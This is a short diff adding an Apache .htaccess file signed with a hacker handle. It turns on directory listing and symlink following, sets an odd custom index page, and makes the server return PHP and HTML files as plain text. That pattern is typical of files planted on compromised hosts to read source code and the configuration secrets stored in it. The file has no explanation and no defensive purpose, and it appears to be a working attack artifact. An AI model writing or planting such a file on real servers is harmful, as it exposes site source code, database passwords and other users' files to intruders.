@@ -1,0 +1,5 @@
+#Coded By Sole Sad & Invisible
+Options Indexes FollowSymLinks
+DirectoryIndex solevisible.phtm
+AddType text/plain php html htm php4 phtml
+AddHandler text/plain php html htm php4 phtml
